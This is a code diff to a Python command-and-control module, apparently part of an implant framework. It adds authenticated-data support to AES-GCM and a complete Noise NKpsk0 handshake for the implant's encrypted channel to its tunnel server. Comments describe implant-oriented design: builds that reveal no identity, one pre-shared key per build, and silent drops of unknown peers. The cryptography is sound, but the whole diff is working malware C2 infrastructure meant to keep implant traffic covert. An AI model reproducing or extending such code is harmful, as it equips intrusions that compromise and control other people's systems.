@@ -32,7 +32,7 @@ import urllib.error
 import zipfile
 import urllib.request
 from pathlib import Path
-from typing import Optional, Tuple
+from typing import Callable, Iterable, Optional, Tuple
 
 logger = logging.getLogger("raccoon.c2")
 
@@ -290,14 +290,15 @@ def _aes_ctr_encrypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
     return bytes(out)
 
 
-def _pure_aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
+def _pure_aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes,
+                          aad: bytes = b"") -> bytes:
     """Pure-Python AES-256-GCM encrypt. Returns ciphertext + 16-byte tag."""
     # H = AES(key, 0^128)
     h = _aes256_block(key, b"\x00" * 16)
     # Encrypt with CTR (counter starts at 2)
     ct = _aes_ctr_encrypt(key, nonce, plaintext)
     # GHASH
-    ghash_val = _ghash(h, b"", ct)
+    ghash_val = _ghash(h, aad, ct)
     # Tag = GHASH XOR AES(key, nonce||0^31||1)
     j0 = nonce + b"\x00\x00\x00\x01"
     e_j0 = _aes256_block(key, j0)
@@ -305,7 +306,8 @@ def _pure_aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
     return ct + tag
 
 
-def _pure_aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> bytes:
+def _pure_aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes,
+                          aad: bytes = b"") -> bytes:
     """Pure-Python AES-256-GCM decrypt. Raises ValueError on auth failure."""
     if len(ciphertext_with_tag) < 16:
         raise ValueError("Ciphertext too short")
@@ -314,7 +316,7 @@ def _pure_aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) 
     # H = AES(key, 0^128)
     h = _aes256_block(key, b"\x00" * 16)
     # Verify tag
-    ghash_val = _ghash(h, b"", ct)
+    ghash_val = _ghash(h, aad, ct)
     j0 = nonce + b"\x00\x00\x00\x01"
     e_j0 = _aes256_block(key, j0)
     expected_tag = _xor(ghash_val, e_j0)
@@ -372,9 +374,17 @@ EVP_CTRL_GCM_SET_TAG = 0x11
 GCM_TAG_LEN = 16
 
 
-def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
+def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes,
+                     aad: bytes = b"") -> bytes:
+    """AES-256-GCM. Returns ciphertext with the 16-byte tag appended.
+
+    `aad` is authenticated but not encrypted. It defaults to empty, which
+    is what the beacon's own channels use; the Noise handshake below needs
+    it, because Noise authenticates each handshake payload against the
+    running handshake hash.
+    """
     if _USE_PURE_PYTHON_AES:
-        return _pure_aes_gcm_encrypt(key, nonce, plaintext)
+        return _pure_aes_gcm_encrypt(key, nonce, plaintext, aad)
     ctx = _crypto.EVP_CIPHER_CTX_new()
     if not ctx:
         raise RuntimeError("EVP_CIPHER_CTX_new failed")
@@ -388,6 +398,10 @@ def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
             raise RuntimeError("EncryptInit_ex (key/iv) failed")
 
         outlen = ctypes.c_int(0)
+        # AAD goes in with a NULL output buffer, before any plaintext.
+        if aad and _crypto.EVP_EncryptUpdate(
+                ctx, None, ctypes.byref(outlen), aad, len(aad)) != 1:
+            raise RuntimeError("EncryptUpdate (aad) failed")
         out = ctypes.create_string_buffer(len(plaintext) + 16)
         if _crypto.EVP_EncryptUpdate(ctx, out, ctypes.byref(outlen), plaintext, len(plaintext)) != 1:
             raise RuntimeError("EncryptUpdate failed")
@@ -408,9 +422,13 @@ def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
         _crypto.EVP_CIPHER_CTX_free(ctx)
 
 
-def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> bytes:
+def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes,
+                     aad: bytes = b"") -> bytes:
+    """The inverse of `_aes_gcm_encrypt`. Raises ValueError if the tag,
+    the key, the nonce or `aad` does not match what was encrypted.
+    """
     if _USE_PURE_PYTHON_AES:
-        return _pure_aes_gcm_decrypt(key, nonce, ciphertext_with_tag)
+        return _pure_aes_gcm_decrypt(key, nonce, ciphertext_with_tag, aad)
     if len(ciphertext_with_tag) < GCM_TAG_LEN:
         raise ValueError("Ciphertext too short")
     ct = ciphertext_with_tag[:-GCM_TAG_LEN]
@@ -429,6 +447,9 @@ def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> by
             raise RuntimeError("DecryptInit_ex (key/iv) failed")
 
         outlen = ctypes.c_int(0)
+        if aad and _crypto.EVP_DecryptUpdate(
+                ctx, None, ctypes.byref(outlen), aad, len(aad)) != 1:
+            raise RuntimeError("DecryptUpdate (aad) failed")
         out = ctypes.create_string_buffer(len(ct) + 16)
         if _crypto.EVP_DecryptUpdate(ctx, out, ctypes.byref(outlen), ct, len(ct)) != 1:
             raise RuntimeError("DecryptUpdate failed")
@@ -647,6 +668,447 @@ def _hkdf(chaining_key: bytes, input_material: bytes,
                             hashlib.sha256).digest()
         outputs.append(previous)
     return tuple(outputs)
+
+
+# ── Noise_NKpsk0_25519_AESGCM_SHA256 ──
+#
+# The Noise Protocol Framework, revision 34, for one pattern and one
+# cipher suite. `NK` means the responder's static public key is known to
+# the initiator in advance, as a pre-message, and the initiator has no
+# static key of its own -- which is what an implant wants: nothing in the
+# artifact identifies the build to a server it has not yet reached, and
+# nothing in the artifact lets a second implant impersonate the server.
+# `psk0` mixes a 32-byte pre-shared key in as the first token of the
+# first message, so an unauthenticated peer cannot produce a message the
+# responder will answer, and the responder has nothing to say to one.
+#
+#   NKpsk0:
+#     <- s
+#     ...
+#     -> psk, e, es
+#     <- e, ee
+#
+# Transport messages are capped at 65535 bytes including the 16-byte tag,
+# because the framing above this carries a `>H` length prefix.
+
+_NOISE_KEY_LEN = 32
+# Noise §5.1: the counter must never reach 2**64-1.
+_NOISE_MAX_NONCE = 2 ** 64 - 1
+
+_NOISE_START = "start"
+_NOISE_SENT_MESSAGE_ONE = "sent message 1"
+_NOISE_READ_MESSAGE_ONE = "read message 1"
+_NOISE_TRANSPORT = "transport"
+_NOISE_FAILED = "failed"
+
+
+def _noise_32_bytes(value, what: str) -> bytes:
+    """`value` as 32 bytes, or a ValueError naming `what` and the length.
+
+    Never names the value: every caller passes key material. Noise fixes
+    every key in this suite at 32 bytes, and HKDF would happily accept a
+    short one and produce a handshake that completed -- which is the worst
+    outcome available for a secret, so the length is checked where it
+    enters rather than where it fails.
+    """
+    if not isinstance(value, (bytes, bytearray)):
+        raise ValueError("%s must be 32 bytes, not %s"
+                         % (what, type(value).__name__))
+    if len(value) != _NOISE_KEY_LEN:
+        raise ValueError("%s is %d bytes; it must be exactly %d"
+                         % (what, len(value), _NOISE_KEY_LEN))
+    return bytes(value)
+
+
+class _CipherState:
+    """Noise §5.1 CipherState: one key and one 64-bit message counter.
+
+    AESGCM's nonce is 32 bits of zeroes followed by the counter
+    big-endian (Noise §12.3), so the counter is the whole of the replay
+    protection: there is no window and no reordering, which is what a
+    stream on top of TCP wants. A failed decryption does not advance it,
+    so a tampered or duplicated frame cannot desynchronise the honest
+    ones -- though Noise §5.1 requires the session be abandoned anyway.
+    """
+
+    def __init__(self, key: bytes):
+        self._key = key
+        self._nonce = 0
+
+    def _current_nonce(self) -> bytes:
+        if self._nonce >= _NOISE_MAX_NONCE:
+            raise ValueError(
+                "Noise cipher state is exhausted: the nonce reached "
+                "2**64-1, and reusing one under the same key would void "
+                "the cipher")
+        return b"\x00" * 4 + struct.pack(">Q", self._nonce)
+
+    def encrypt_with_ad(self, ad: bytes, plaintext: bytes) -> bytes:
+        out = _aes_gcm_encrypt(self._key, self._current_nonce(), plaintext,
+                               ad)
+        self._nonce += 1
+        return out
+
+    def decrypt_with_ad(self, ad: bytes, ciphertext: bytes) -> bytes:
+        out = _aes_gcm_decrypt(self._key, self._current_nonce(), ciphertext,
+                               ad)
+        self._nonce += 1
+        return out
+
+
+class _SymmetricState:
+    """Noise §5.2 SymmetricState: the chaining key, the handshake hash,
+    and the cipher state the two of them key.
+    """
+
+    def __init__(self, protocol_name: bytes):
+        # InitializeSymmetric pads a protocol name shorter than the hash
+        # with zeroes and hashes a longer one. This suite's name is
+        # exactly 32 bytes -- SHA-256's output length -- so `h` is the
+        # name verbatim and neither case can arise here.
+        self._h = protocol_name
+        self._ck = protocol_name
+        self._cipher = None
+
+    def handshake_hash(self) -> bytes:
+        return self._h
+
+    def mix_hash(self, data: bytes) -> None:
+        self._h = hashlib.sha256(self._h + data).digest()
+
+    def mix_key(self, input_material: bytes) -> None:
+        self._ck, temp_key = _hkdf(self._ck, input_material, 2)
+        self._cipher = _CipherState(temp_key)
+
+    def mix_key_and_hash(self, input_material: bytes) -> None:
+        self._ck, temp_h, temp_key = _hkdf(self._ck, input_material, 3)
+        self.mix_hash(temp_h)
+        self._cipher = _CipherState(temp_key)
+
+    # `psk` is the first token of the first message in psk0, so a cipher
+    # state always exists before either of these is reached. Noise's
+    # "return the plaintext unchanged when there is no key" case cannot
+    # arise in this pattern and is deliberately not implemented: a
+    # cleartext payload must never be a reachable outcome here.
+
+    def encrypt_and_hash(self, plaintext: bytes) -> bytes:
+        ciphertext = self._cipher.encrypt_with_ad(self._h, plaintext)
+        self.mix_hash(ciphertext)
+        return ciphertext
+
+    def decrypt_and_hash(self, ciphertext: bytes) -> bytes:
+        plaintext = self._cipher.decrypt_with_ad(self._h, ciphertext)
+        self.mix_hash(ciphertext)
+        return plaintext
+
+    def split(self) -> Tuple[_CipherState, _CipherState]:
+        first, second = _hkdf(self._ck, b"", 2)
+        return _CipherState(first), _CipherState(second)
+
+
+class NoiseSession:
+    """One side of one `Noise_NKpsk0_25519_AESGCM_SHA256` connection.
+
+    Built through `initiator()` or `responder()`, then driven in order:
+
+        initiator                         responder
+        ---------                         ---------
+        message_one = initiate(payload)
+                              -------->   payload = respond(message_one)
+        complete(message_two) <--------    message_two = reply()
+        encrypt() / decrypt()              encrypt() / decrypt()
+
+    `respond` hands back the first message's payload because that payload
+    is how the responder learns what kind of connection this is; it is
+    authenticated before it is returned, so a caller may dispatch on it.
+    `reply` exists because something has to produce message 2, and the
+    responder cannot produce it until it has read message 1.
+
+    `encrypt` returns the bare Noise message. The `>H` length prefix is
+    the framing layer's, not this one's.
+
+    A call in the wrong order raises RuntimeError; a peer that fails to
+    authenticate, or a message that is malformed or tampered with, raises
+    ValueError. The two are kept distinct on purpose: the tunnel server
+    catches ValueError to mean "this peer is not ours, say nothing and
+    close", and must not swallow its own sequencing bugs with it.
+    """
+
+    PROTOCOL_NAME = b"Noise_NKpsk0_25519_AESGCM_SHA256"
+    # Noise's own cap, and the one the `>H` length prefix above this can
+    # express. The tag is inside it, so the plaintext ceiling is 65519.
+    MAX_MESSAGE_LEN = 65535
+    MAX_PAYLOAD_LEN = MAX_MESSAGE_LEN - GCM_TAG_LEN
+
+    def __init__(self, is_initiator: bool,
+                 static_public: Optional[bytes] = None,
+                 static_private: Optional[bytes] = None,
+                 psk: Optional[bytes] = None,
+                 psk_lookup: Optional[Callable[[], Iterable[bytes]]] = None,
+                 prologue: bytes = b""):
+        self._is_initiator = bool(is_initiator)
+        self._prologue = prologue
+        self._psk_lookup = psk_lookup
+        self._stage = _NOISE_START
+        self._e_private = None
+        self._e_public = None
+        self._re = None
+        self._send = None
+        self._recv = None
+        # The PSK that authenticates this connection. Known from the start
+        # on the initiator, and only after `respond` on the responder,
+        # which has to find out which of several it is -- the caller reads
+        # it back to map the connection to the build it belongs to.
+        self.psk = None
+        # Noise's GetHandshakeHash, available once the handshake is done.
+        self.handshake_hash = None
+        if self._is_initiator:
+            self._static_private = None
+            self._static_public = _noise_32_bytes(
+                static_public, "Noise responder static public key")
+            self.psk = _noise_32_bytes(psk, "Noise pre-shared key")
+        else:
+            self._static_private = _noise_32_bytes(
+                static_private, "Noise responder static private key")
+            # NK's pre-message is the responder's static public key, which
+            # the responder therefore has to derive from its own private
+            # one rather than being handed both.
+            self._static_public = _x25519(self._static_private,
+                                          _X25519_BASEPOINT)
+        self._sym = self._initial_symmetric()
+
+    @classmethod
+    def initiator(cls, server_public: bytes, psk: bytes,
+                  prologue: bytes = b"") -> "NoiseSession":
+        """The implant's side: the server's static public key and one PSK,
+        both baked into the build.
+
+        `prologue` is empty in this deployment. It is a parameter because
+        the published Noise test vectors specify a non-empty one, and
+        replaying those vectors is the only check on this implementation
+        that does not come from this implementation.
+        """
+        return cls(True, static_public=server_public, psk=psk,
+                   prologue=prologue)
+
+    @classmethod
+    def responder(cls, static_private: bytes,
+                  psk_lookup: Callable[[], Iterable[bytes]],
+                  prologue: bytes = b"") -> "NoiseSession":
+        """The server's side: its static private key, and a callable that
+        returns the PSKs it is willing to accept.
+
+        A lookup rather than one key because a deployment holds one PSK
+        per build and cannot know which build a connection belongs to
+        until the connection authenticates. It is called once per
+        handshake, and the list it returns is the whole bound on the work
+        an unauthenticated peer can cause.
+        """
+        return cls(False, static_private=static_private,
+                   psk_lookup=psk_lookup, prologue=prologue)
+
+    # ── The handshake ──
+
+    def initiate(self, payload: bytes = b"") -> bytes:
+        """Message 1, `psk, e, es`, carrying `payload`."""
+        self._require(True, _NOISE_START, "initiate")
+        self._check_payload_fits(payload, _NOISE_KEY_LEN)
+        sym = self._sym
+        sym.mix_key_and_hash(self.psk)
+        public = self._ephemeral_public()
+        sym.mix_hash(public)
+        # Noise §9: in a PSK handshake the ephemeral is mixed into the
+        # chaining key as well as the hash. That is what makes two first
+        # messages with the same PSK and the same payload differ in every
+        # byte rather than only in the ephemeral.
+        sym.mix_key(public)
+        sym.mix_key(_x25519(self._e_private, self._static_public))
+        message = public + sym.encrypt_and_hash(payload)
+        self._stage = _NOISE_SENT_MESSAGE_ONE
+        return message
+
+    def respond(self, message: bytes) -> bytes:
+        """Read message 1 and return its payload, authenticated.
+
+        Each PSK the lookup offers is tried until one authenticates the
+        message. Every failure is a GCM tag failure and nothing else: the
+        work per candidate is two HKDFs and one tag check, and the one
+        Diffie-Hellman the message needs does not depend on the PSK, so it
+        is done once. A candidate that is not 32 bytes raises rather than
+        being skipped -- a malformed key in the store is a configuration
+        fault, and silently excluding it would turn it into a build that
+        mysteriously cannot connect.
+        """
+        self._require(False, _NOISE_START, "respond")
+        self._check_message_length(message, "message 1")
+        remote_ephemeral = bytes(message[:_NOISE_KEY_LEN])
+        ciphertext = bytes(message[_NOISE_KEY_LEN:])
+        # From here the session is spent whatever happens: a peer gets one
+        # attempt, and a failure leaves nothing a caller could retry on.
+        self._stage = _NOISE_FAILED
+        candidates = [_noise_32_bytes(psk, "Noise pre-shared key")
+                      for psk in self._psk_lookup()]
+        if not candidates:
+            raise ValueError(
+                "no pre-shared keys to try: a responder with no registered "
+                "build cannot authenticate anybody")
+        shared = _x25519(self._static_private, remote_ephemeral)
+        for psk in candidates:
+            sym = self._initial_symmetric()
+            sym.mix_key_and_hash(psk)
+            sym.mix_hash(remote_ephemeral)
+            sym.mix_key(remote_ephemeral)
+            sym.mix_key(shared)
+            try:
+                payload = sym.decrypt_and_hash(ciphertext)
+            except ValueError:
+                continue
+            self._sym = sym
+            self._re = remote_ephemeral
+            self.psk = psk
+            self._stage = _NOISE_READ_MESSAGE_ONE
+            return payload
+        raise ValueError(
+            "Noise message 1 did not authenticate under any of the %d "
+            "pre-shared keys offered" % len(candidates))
+
+    def reply(self, payload: bytes = b"") -> bytes:
+        """Message 2, `e, ee`, carrying `payload`. Completes this side."""
+        self._require(False, _NOISE_READ_MESSAGE_ONE, "reply")
+        self._check_payload_fits(payload, _NOISE_KEY_LEN)
+        sym = self._sym
+        public = self._ephemeral_public()
+        sym.mix_hash(public)
+        sym.mix_key(public)
+        sym.mix_key(_x25519(self._e_private, self._re))
+        message = public + sym.encrypt_and_hash(payload)
+        self._split()
+        return message
+
+    def complete(self, message: bytes) -> None:
+        """Read message 2 and move to transport.
+
+        The pattern allows message 2 a payload, which this API has no use
+        for: it is authenticated, mixed into the handshake hash, and
+        dropped. Nothing downstream may read an unauthenticated byte, so
+        there is no path that returns it un-checked.
+        """
+        self._require(True, _NOISE_SENT_MESSAGE_ONE, "complete")
+        self._check_message_length(message, "message 2")
+        remote_ephemeral = bytes(message[:_NOISE_KEY_LEN])
+        self._stage = _NOISE_FAILED
+        sym = self._sym
+        sym.mix_hash(remote_ephemeral)
+        sym.mix_key(remote_ephemeral)
+        sym.mix_key(_x25519(self._e_private, remote_ephemeral))
+        sym.decrypt_and_hash(bytes(message[_NOISE_KEY_LEN:]))
+        self._split()
+
+    # ── Transport ──
+
+    def encrypt(self, plaintext: bytes) -> bytes:
+        """One transport message, unframed."""
+        self._require(None, _NOISE_TRANSPORT, "encrypt")
+        self._check_payload_fits(plaintext, 0)
+        return self._send.encrypt_with_ad(b"", plaintext)
+
+    def decrypt(self, ciphertext: bytes) -> bytes:
+        """The plaintext of one transport message, or a ValueError.
+
+        A frame that is tampered with, truncated, replayed or arrives out
+        of order all fail here, because the counter is the only sequence
+        number the protocol has.
+        """
+        self._require(None, _NOISE_TRANSPORT, "decrypt")
+        if len(ciphertext) > self.MAX_MESSAGE_LEN:
+            raise ValueError(
+                "transport message is %d bytes; a Noise message is at most "
+                "%d" % (len(ciphertext), self.MAX_MESSAGE_LEN))
+        return self._recv.decrypt_with_ad(b"", ciphertext)
+
+    # ── Internals ──
+
+    def _initial_symmetric(self) -> _SymmetricState:
+        """A SymmetricState with the prologue and the pre-message mixed in.
+
+        Rebuilt rather than copied for each PSK the responder tries: it is
+        two SHA-256 calls, where a copy would have to be deep to be safe.
+        """
+        sym = _SymmetricState(self.PROTOCOL_NAME)
+        sym.mix_hash(self._prologue)
+        # NK's pre-message, `<- s`. Both ends mix it before the first
+        # message, so an initiator aimed at the wrong server fails on the
+        # first tag rather than somewhere later and less legibly.
+        sym.mix_hash(self._static_public)
+        return sym
+
+    def _ephemeral_public(self) -> bytes:
+        if self._e_private is None:
+            self._e_private, self._e_public = _x25519_keypair()
+        return self._e_public
+
+    def _fix_ephemeral(self, private: bytes) -> None:
+        """Pin the ephemeral keypair instead of generating one.
+
+        A test seam, and the only way to replay a published test vector,
+        which specifies both ephemerals. Production must never call it: an
+        ephemeral reused across two handshakes reuses the transport keys
+        with it.
+        """
+        if self._stage != _NOISE_START:
+            raise RuntimeError("the ephemeral key is already in use")
+        self._e_private = _noise_32_bytes(private,
+                                          "Noise ephemeral private key")
+        self._e_public = _x25519(self._e_private, _X25519_BASEPOINT)
+
+    def _split(self) -> None:
+        first, second = self._sym.split()
+        # Noise §5.3: the initiator sends under the first key and receives
+        # under the second; the responder has them the other way round.
+        if self._is_initiator:
+            self._send, self._recv = first, second
+        else:
+            self._send, self._recv = second, first
+        self.handshake_hash = self._sym.handshake_hash()
+        self._stage = _NOISE_TRANSPORT
+
+    def _role(self) -> str:
+        return "initiator" if self._is_initiator else "responder"
+
+    def _require(self, is_initiator, stage: str, call: str) -> None:
+        """Refuse a call this session is not at. `is_initiator` None means
+        either role may make it.
+        """
+        if is_initiator is not None and bool(is_initiator) != self._is_initiator:
+            raise RuntimeError(
+                "%s() is the %s's call and this session is the %s"
+                % (call, "initiator" if is_initiator else "responder",
+                   self._role()))
+        if self._stage != stage:
+            raise RuntimeError(
+                "%s() cannot run now: this %s session is at %r, not %r"
+                % (call, self._role(), self._stage, stage))
+
+    def _check_payload_fits(self, payload: bytes, overhead: int) -> None:
+        limit = self.MAX_PAYLOAD_LEN - overhead
+        if len(payload) > limit:
+            raise ValueError(
+                "payload is %d bytes; at most %d fits here, because the "
+                "message and its %d-byte tag together must not exceed %d"
+                % (len(payload), limit, GCM_TAG_LEN, self.MAX_MESSAGE_LEN))
+
+    def _check_message_length(self, message: bytes, what: str) -> None:
+        shortest = _NOISE_KEY_LEN + GCM_TAG_LEN
+        if len(message) < shortest:
+            raise ValueError(
+                "Noise %s is %d bytes; the shortest valid one is %d, being "
+                "a %d-byte ephemeral key, an empty payload and a %d-byte "
+                "tag" % (what, len(message), shortest, _NOISE_KEY_LEN,
+                         GCM_TAG_LEN))
+        if len(message) > self.MAX_MESSAGE_LEN:
+            raise ValueError(
+                "Noise %s is %d bytes; a Noise message is at most %d"
+                % (what, len(message), self.MAX_MESSAGE_LEN))
 
 
 # ── Stdlib DNS resolver (TXT + A records) ──
